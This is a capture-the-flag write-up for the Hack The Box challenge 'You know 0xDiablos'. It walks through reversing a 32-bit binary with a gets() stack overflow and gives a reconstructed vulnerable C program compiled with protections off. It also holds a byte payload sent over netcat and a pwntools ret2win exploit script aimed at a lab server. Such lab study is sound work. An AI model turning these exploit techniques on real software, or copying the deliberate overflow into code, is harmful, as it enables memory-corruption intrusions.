---
description: 08/22/2023
---

# ðŸ‘¿ You know 0xDiablos

## Challenge

{% embed url="https://app.hackthebox.com/challenges/you-know-0xdiablos" %}

## Challenge Description

> I missed my flag

This was a great challenge that allowed me to practice my skills learned from this video from CryptoCat:&#x20;

{% embed url="https://www.youtube.com/watch?v=vO1Uj2v3r7I&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&index=5" %}

I was able to identify the vulnerability almost immediately when I analyzed the binary in Ghidra. This felt really good! It was clear that when we had a lucrative flag that wasn't being called in `main()` that we were going to have to do a **ret2win** of sorts ;).&#x20;

I hope you enjoy!

## Enumeration

`file`:

{% code overflow="wrap" %}
```
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped 
```
{% endcode %}

`checksec`:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Interesting, this binary was compiled with <mark style="color:red;">no memory protections</mark> whatsoever.

## Reversing

Load up vuln in `ghidra`.

We have a non-stripped binary, let's check out `main()`'s decompilation and disassembly.

`main()`:

```c
undefined4 main(void)

{
  __gid_t __rgid;
  
  setvbuf(_stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

We can see a `setvbuf()` call that will open stream to change the block's buffer.

This means that information will appear on the destination file/terminal during it being written as long as it is unbuffered. Also, `fflush()` is commonly seen here, but we don't see it. This is to force out the block early.

The `puts()` call is simply just printing "`You know who are 0xDiablos:` " to the screen, immediately calling `vuln()` after and awaiting our input. This can be assumed that something in vuln() is being used to grab our STDIN.

So, we now know our next target/task, <mark style="color:yellow;">let's find out what's going on in the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`vuln()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">function</mark>.

`vuln()`:

```c
void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}
```

We can see that we are allocating a char data-type buffer of 180-bytes.

* However, we do not know the variable due to the compiler simply not caring about variables

`gets()` is a deprecated function that is super dangerous because it will allow us to store characters on the stack past the buffer. We can see that whatever we send via STDIN will be sent directly to our buffer `local_bc` which is of 180-bytes. So, I'm thinking buffer overflow of sorts?

* It is recommended to use `fgets()` instead.&#x20;

There is then a call to `puts()` that will print our whatever we sent to the buffer. Thus, reflecting our STDIN back to the console.

Upon further analysis, `flag()` is another lucrative function that is being used to print out our `flag.txt`! So it is now clear that we must conduct a ret2win attack since there are no memory protections in play and `flag()` is not being called in `main()` or `vuln()`, meaning that it is still being loaded in memory, but never being called.&#x20;

<mark style="color:yellow;">So, what if we can divert execution to flag() rather than returning to main after completing the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`vuln()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">function?</mark>

`flag()` decompilation:

```c
void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == L'\xdeadbeef') && (param_2 == L'\xc0ded00d')) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

Please note that I converted the hex values of the parameters to strings so I could place them in a human-readable format.

We can see that we have 2 parameters. Since this is a 32-bit program, they will be stored on the stack rather than in registers.&#x20;

<mark style="color:yellow;">param\_1</mark> = `xdeadbeef`

<mark style="color:yellow;">param\_2</mark> = `xc0ded00d`

At this point, I thought it would be fun to try to put the code close to the original source as possible:

`vuln-reconstructed.c`:

```c
#include <stdio.h>

void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == L'\xdeadbeef') && (param_2 == L'\xc0ded00d')) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                
  exit(0);
}

void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}

void main(void)

{
  __gid_t __rgid;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

It compiled and worked perfectly. This was just for fun though since I'm still learning!

Compilation:

{% code overflow="wrap" %}
```
gcc vuln-reconstructed.c -o vuln-reconstructed -m32 -fno-stack-protector -z execstack -no-pie -g
```
{% endcode %}

Let's find the offset to the return address:

We will want to use `vuln()` since that is what we are targeting.

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Okay we see `0xbc` being placed onto the stack.

Let's convert this to decimal to get the offset:

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

188!

We can also do this in `gdb`:

```
cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

Cool, we now have a cyclic pattern that changes every 4-bytes.

Let's send it to our program so we store it in our 188-byte buffer. This will obviously overflow due to the usage of `gets()`, but this is what we want. <mark style="color:yellow;">So we can see the first 4-bytes that overwrite the EIP</mark>.

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

We can see that the first 4-bytes that overflow the EIP is 'waab'.

We can then do a `cyclic -l` to see the offset:

```
cyclic -l waab
Finding cyclic pattern of 4 bytes: b'waab' (hex: 0x77616162)
Found at offset 188
```

Boom! Same thing that we gathered from `ghidra`.

Viewing the disassembly of `vuln()`:

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Let's grab the EBP of `vuln()`: <mark style="color:red;">`0x08049272`</mark>

## Exploitation

### Manual Exploitation

We can use `python3` to overflow the buffer. It's about time I start using `python3` for manual exploitation XD.

Exploit Structure: <mark style="color:yellow;">188 junk A's (padding) + flag() EBP address + "junk return address" & param\_1 & param\_2</mark>

{% code overflow="wrap" %}
```python
python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08'+b'1337\xef\xbe\xad\xde\x0d\xd0\xde\xc0')"  > payload
```
{% endcode %}

We want to divert execution to `flag()`, so we need to grab the EBP address of that function via disassembly:

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

Create a test flag:

```
echo "HERE_IS_YOUR_FLAG!!!!" > flag.txt
```

Exploit:

```
cat payload | ./vuln
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can also send it to the remote server hosting the binary on HTB's infrastructure via:

```
cat payload - | nc <IP_HERE> <PORT_HERE>
```

We need a `-` so we send payload to STDIN after our pipe.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Automated Exploitation

`exploit.py`:

```python
from pwn import *


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=True) # You can set this to false to not see checksec info
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(200))

# Connect to remote server
io = remote('167.172.61.89', 30056)

# Build the payload
payload = flat({
    offset: [
        # 32-bit the params follow the function
        elf.functions.flag,
        0x0,  # Original: 0x0 . This is the junk parameter -- This can be in hex or a 4-byte word i.e. ("junk"). Return pointer - try changing to main() and step through with GDB!
        0xdeadbeef,  # Param_1
        0xc0ded00d,  # Param_2
    ]
})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Get flag
io.interactive()
```

Result:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

